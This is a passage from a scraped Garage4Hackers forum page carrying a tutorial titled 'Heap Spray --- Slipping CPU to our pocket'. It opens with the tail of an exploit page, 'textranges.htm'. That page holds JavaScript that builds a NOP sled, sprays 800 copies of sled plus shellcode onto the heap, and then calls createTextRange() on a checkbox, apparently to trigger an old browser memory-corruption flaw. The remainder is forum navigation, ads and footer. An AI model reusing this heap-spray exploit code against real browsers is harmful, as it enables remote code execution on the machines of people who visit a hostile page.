while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br/>
heapshell=bigblock.substring(0,shellcodesize);<br/>
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br/>
while(nopsled.length+shellcodesize&lt;0x86000){nopsle  d=nopsled+nopsled+heapshell}<br/>
<br/>
spray=new Array();var i=0;<br/>
for(i=0;i&lt;800;i++){spray[i]=nopsled+shellcode;}<br/>
/*--------------------heap sprayer end----------------------*/<br/>
&lt;/script&gt;<br/>
&lt;input type="checkbox" id='checkid'&gt;<br/>
&lt;script type=text/javascript language=javascript&gt;<br/>
a=document.getElementById('checkid');<br/>
b=a.createTextRange();<br/>
&lt;/script&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;<br/>
&lt;!--------------------textranges.htm end--------------&gt;</div>

	

	
		<script src="clientscript/vbulletin_lightbox6719.html?v=421" type="text/javascript"></script>
		<script type="text/javascript">
		<!--
		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
		//-->
		</script>
	

	

	
		<sub class="article_promoted_text">
			This article was originally published in blog:
			<a href="blogc1f0.html?u=18">Heap Spray --- Slipping CPU to our pocket--by "vinnu"</a>
			started by
			<a href="memberc1f0.html?u=18">prashant_uniyal</a>
		</sub>
	
	<div class="cmslinks">

		
	
		<div>
			<div id="articletagcontainer_17">
				Tags: 
		
			<a href="tagsa7fb.html?tag=heap+spray">heap spray</a>
		

<img alt="" class="inlineimg hidden" id="tag_form_progress" src="images/misc/11x11progress.gif"/>
			</div>
		</div>
	
	</div>

    
	<script type="text/javascript">
	var THREADID = 219;
	var THIS_URL = "contentda98.html?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot";
	var MIN_CHARS = 30;
	vbphrase['comment'] = "Comment";
	vbphrase['comments'] = "Comments";
</script>
<div class="cms_comments_page" id="comments">
	<a name="comments_start"></a>
	
	<script src="clientscript/vbulletin-editor6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_quick_edit6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_post_loader6719.html?v=421" type="text/javascript"></script>
	<div id="node_comments_hide"></div>
	<!-- EDITOR IS BREAKING THE PAGE -->
	
</div>


</div></li>
</ul>
					</div>
				</div>
			</div>
		</div>
		<div class="yui-b yui-sidebar">
			<ul class="list_no_decoration widget_list" id="widgetlist_column3">
<li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img alt="" src="images/site_icons/html.png"/> G4H Facebook</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<div class="fb-like-box" data-colorscheme="light" data-header="true" data-height="250" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-show-border="true" data-show-faces="true" data-stream="false" data-width="300"></div>
		</div>
	</div>
</div></li><li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img alt="" src="images/site_icons/html.png"/> G4H Twitter</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<a class="twitter-timeline" data-widget-id="387207513831010305" href="https://twitter.com/garage4hackers">Tweets by @garage4hackers</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
		</div>
	</div>
</div></li>
</ul>
		</div>
	</div>
</div>

</div>

<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
</div>

<div class="floatcontainer footer" id="footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label=" Standard Styles">
									
					
	<option class="" selected="selected" value="1">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label=" Mobile Styles">
					
					
	<option class="" value="2">-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul class="footer_links" id="footer_links">
		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="#" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="contentda98.html?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">03:54 PM</span>.</div>

<div class="shade footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="shade footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	<img alt="" border="0" height="1" src="cron01d5.gif?rand=1584872669" width="1"/>
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>

</div></body></html>